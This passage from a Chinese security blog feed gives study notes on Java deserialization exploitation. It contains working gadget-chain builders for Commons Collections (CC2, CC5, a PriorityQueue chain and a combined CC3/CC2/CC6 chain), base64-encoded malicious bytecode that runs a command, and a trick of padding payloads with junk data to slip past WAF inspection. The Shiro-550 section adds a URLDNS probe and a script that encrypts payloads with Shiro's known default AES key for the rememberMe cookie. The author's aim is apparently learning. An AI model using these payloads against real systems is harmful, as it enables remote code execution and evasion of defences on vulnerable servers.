<p>按照一步步添加进去进行反序列化,发现有个问题,就是size必须大于2,因为<code>heapify</code>进行了无符号位右移是否大于0的判断</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220316003358028.png" alt="image-20220316003358028"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        </span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line"></span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransform = <span class="keyword">new</span> ChainedTransformer&lt;&gt;(transformers);</span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator&lt;&gt;(Chainedtransform);</span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        SerializeTest.serialize(priorityQueue);</span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在add的时候会调用到<code>offer</code>—&gt;<code>siftUp</code>—&gt;<code>siftUpUsingComparator</code>从而调用到<code>compare</code>方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220316003551221.png" alt="image-20220316003551221"></p>
<p>所以效仿之前可以在add之前将TransformingComparator的参数随便弄一个,然后add之后再通过反射来修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line"></span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransform = <span class="keyword">new</span> ChainedTransformer&lt;&gt;(transformers);</span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator&lt;&gt;(<span class="keyword">new</span> ConstantTransformer&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;? extends TransformingComparator&gt; transformingComparatorClass = transformingComparator.getClass();</span><br><span class="line">        Field transformingComparatorClassDeclaredField = transformingComparatorClass.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformingComparatorClassDeclaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        transformingComparatorClassDeclaredField.set(transformingComparator,Chainedtransform);</span><br><span class="line">        SerializeTest.serialize(priorityQueue);</span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>总结</p>
</blockquote>
<p>在学习过程中,对于java的反射,代理,接口,等等基础知识有了更深刻的理解,尤其是在抽象类的部分,也感受到了什么叫”基础不牢,地动山摇”,后序还有几条链没有复现,现在虽然都跟着做了一遍,但也仅仅是做了一遍,要是自己找反序列化链的话,估计没戏,所以接下来自己跟着思维导图,将每一种可能都模仿一层层找的方式复现一遍</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220401003902537.png" alt="image-20220401003902537"></p>
<h3 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h3><p>特点是没有用到Transformer数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;,<span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">		<span class="comment">//一样是防止add直接执行代码,也可以将newTransformer方法改为toString实现同样效果</span></span><br><span class="line">        Class&lt;? extends TransformingComparator&gt; transformingComparatorClass = transformingComparator.getClass();</span><br><span class="line">        Field transformer = transformingComparatorClass.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        transformer.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        SerializeTest.serialize(priorityQueue);</span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h3><p>基本没有啥可以说的东西,我感觉是最简单的一条链了,唯一需要修改的地方就是在<code>BadAttributeValueExpException</code>的构造函数中会直接调用<code>toString</code>,需要先传递null然后等序列化之前再利用反射改回来</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220316155807311.png" alt="image-20220316155807311"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransform = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> HashMap&lt;Object, Object&gt;() ;</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(map, Chainedtransform);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;? extends BadAttributeValueExpException&gt; badAttributeValueExpExceptionClass = badAttributeValueExpException.getClass();</span><br><span class="line">        Field val = badAttributeValueExpExceptionClass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line">        </span><br><span class="line">        SerializeTest.serialize(badAttributeValueExpException);</span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>







<h3 id="为gadget添加大量垃圾数据"><a href="#为gadget添加大量垃圾数据" class="headerlink" title="为gadget添加大量垃圾数据"></a>为gadget添加大量垃圾数据</h3><p>大多数WAF受限于性能影响，当request足够大时，WAF可能为因为性能原因作出让步，超出检查长度的内容，将不会被检查。</p>
<p>参考<a href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ</a></p>
<p>通过ArrayList添加大量垃圾数据进去,因为ArrayList的<code>readObject</code>方法存在会对List中的每一项除了transient的所有数据序列化,所以可以利用ArrayList实现简单的垃圾数据添加</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList arrayList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        StringBuilder sb=<span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">500000</span>;i++)&#123;</span><br><span class="line">            sb.append(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        arrayList.add(sb);</span><br><span class="line">        arrayList.add(priorityQueue);</span><br><span class="line">        SerializeTest.serialize(arrayList);</span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220330231216877.png" alt="image-20220330231216877"></p>
<p>生成的序列化流也十分<code>壮观</code>,鼠标滚了半天</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java调试环境配置</title>
    <url>/2022/03/09/java%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>java代码调试环境配置<span id="more"></span></p>
<p>首先需要有对应版本的jdk文件,由于windows上的jdk都是exe,所以可以让它安装到虚拟机里面,再把安装的jdk文件夹拷贝出来</p>
<p>然后去下载对应版本的openjdk</p>
<p>参照这篇文章进行操作<a href="https://www.cnblogs.com/haimishasha/p/9909055.html">https://www.cnblogs.com/haimishasha/p/9909055.html</a></p>
<p>解压jdk中的src压缩包</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220311225711001.png" alt="image-20220311225711001"></p>
<p>将<code>openjdk</code>中<code>src\share\classes</code>目录下的sun文件夹复制到<code>jdk</code>src目录中</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220311225744162.png" alt="image-20220311225744162"></p>
<p>接着在idea中将<code>src</code>目录添加到</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220311230642856.png" alt="image-20220311230642856"></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
  </entry>
  <entry>
    <title>shiro</title>
    <url>/2022/03/19/shiro/</url>
    <content><![CDATA[<h3 id="shiro550反序列化学习"><a href="#shiro550反序列化学习" class="headerlink" title="shiro550反序列化学习"></a>shiro550反序列化学习<span id="more"></span></h3><p>首先idea导入shiro自带的<code>shiro\samples\web</code>maven项目，快速搭建一个shiro项目</p>
<p>分析其中包含的依赖（使用maven helper插件），只有runtime和compile的依赖会在项目运行时存在于项目中，其他test的则无法访问到</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220319180339512.png" alt="image-20220319180339512"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220319180428213.png" alt="image-20220319180428213"></p>
<p>所以一般情况下commons-collections中的链无法利用</p>
<p>使用URLDNS序列化后再编码传入进行测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        URL url=<span class="keyword">new</span> URL(<span class="string">&quot;http://9w6ma81q22bbdpbdg2t2ecbiu90zoo.burpcollaborator.net&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;? extends URL&gt; urlClass = url.getClass();</span><br><span class="line">        Field hashCode = urlClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        hashCode.set(url,<span class="number">1234</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">        hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">        SerializeTest.serialize(hashMap);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="加密脚本"><a href="#加密脚本" class="headerlink" title="加密脚本"></a>加密脚本</h5><p>shiro该版本中AES加密秘钥是固定的</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220319203412860.png" alt="image-20220319203412860"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_data</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_enc</span>(<span class="params">data</span>):</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    <span class="comment">#iv是初始向量</span></span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_dec</span>(<span class="params">enc_data</span>):</span></span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    enctyptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintext = enctyptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    <span class="comment"># plaintext=bytes.decode(plaintext)</span></span><br><span class="line">    plaintext = unpad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data = get_file_data(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CC依赖如果存在"><a href="#CC依赖如果存在" class="headerlink" title="CC依赖如果存在"></a>CC依赖如果存在</h3><p>先导入maven依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//cc3+cc2+cc6缝合,不能用数组</span></span><br><span class="line">    <span class="comment">//原因:首先,cc6不受jdk版本限制,接着cc2不需要数组,如果使用Runtime.exec()就必须使用Transformr数组</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">/*byte[] code= Files.readAllBytes(Paths.get(&quot;H:\\java\\classTest\\MyClass.class&quot;));*/</span></span><br><span class="line">        <span class="keyword">byte</span>[] code= Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQANQoACwAaCgAbABwIAB0KABsAHgcAHwoABQAgCQAhACIIACMKACQAJQcAJgcAJwEA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;Bjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAl0cmFuc2Zvcm0BAHIoTGNv&quot;</span> +</span><br><span class="line">                <span class="string">&quot;bS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9h&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApF&quot;</span> +</span><br><span class="line">                <span class="string">&quot;eGNlcHRpb25zBwAoAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMv&quot;</span> +</span><br><span class="line">                <span class="string">&quot;RE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7&quot;</span> +</span><br><span class="line">                <span class="string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9u&quot;</span> +</span><br><span class="line">                <span class="string">&quot;SGFuZGxlcjspVgEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAHwEAClNvdXJjZUZpbGUBAAxN&quot;</span> +</span><br><span class="line">                <span class="string">&quot;eUNsYXNzLmphdmEMAAwADQcAKQwAKgArAQAEY2FsYwwALAAtAQATamF2YS9pby9JT0V4Y2VwdGlv&quot;</span> +</span><br><span class="line">                <span class="string">&quot;bgwALgANBwAvDAAwADEBACVsYW9kIHN1Y2Nlc3MhISEhISEhISEhISEhISEhISEhISEhISEhBwAy&quot;</span> +</span><br><span class="line">                <span class="string">&quot;DAAzADQBAAdNeUNsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRj&quot;</span> +</span><br><span class="line">                <span class="string">&quot;L3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRl&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVu&quot;</span> +</span><br><span class="line">                <span class="string">&quot;dGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7&quot;</span> +</span><br><span class="line">                <span class="string">&quot;KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UBABBqYXZhL2xhbmcvU3lzdGVt&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3By&quot;</span> +</span><br><span class="line">                <span class="string">&quot;aW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAKAAsAAAAAAAQAAQAMAA0AAQAOAAAAHQAB&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AAEAAAAFKrcAAbEAAAABAA8AAAAGAAEAAAAIAAEAEAARAAIADgAAABkAAAADAAAAAbEAAAABAA8A&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AAAGAAEAAAAYABIAAAAEAAEAEwABABAAFAACAA4AAAAZAAAABAAAAAGxAAAAAQAPAAAABgABAAAA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;HQASAAAABAABABMACAAVAA0AAQAOAAAAWwACAAEAAAAauAACEgO2AARLpwAISyq2AAayAAcSCLYA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;CbEAAQAAAAkADAAFAAIADwAAABoABgAAAAwACQAPAAwADQANAA4AEQARABkAEwAWAAAABwACTAcA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;FwQAAQAYAAAAAgAZ&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map= <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> TiedMapEntry(lazyMap,templates);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line">        <span class="comment">//防止在序列化hashCode的时候触发</span></span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        Field factory = lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        factory.set(lazyMap,invokerTransformer);</span><br><span class="line">        serialize(map2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//HashMap.readObject()-&gt;TiedMapEntry.get()--&gt;LazyMap.get()--&gt;invokerTransformer</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="cookie反序列化流程分析"><a href="#cookie反序列化流程分析" class="headerlink" title="cookie反序列化流程分析"></a>cookie反序列化流程分析</h4><p>首先,在idea中通过双击<code>shift</code>查找关键字,cookie有关的类,找到一个<code>CookieRememberMeManager</code>类</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220319234114164.png" alt="image-20220319234114164"></p>
<p>其中有一个<code>getRemeberedSerializedIdentity</code>方法,它的作用是获取cookie中的base64解码后的bytes,调用它的是<code>getRememberedPrincipals</code>方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220319235731776.png" alt="image-20220319235731776"></p>
<p>先获得base64解码后的bytes,然后再调用convertBytesToPrincipals方法,它里面再调用decrypt进行解码</p>
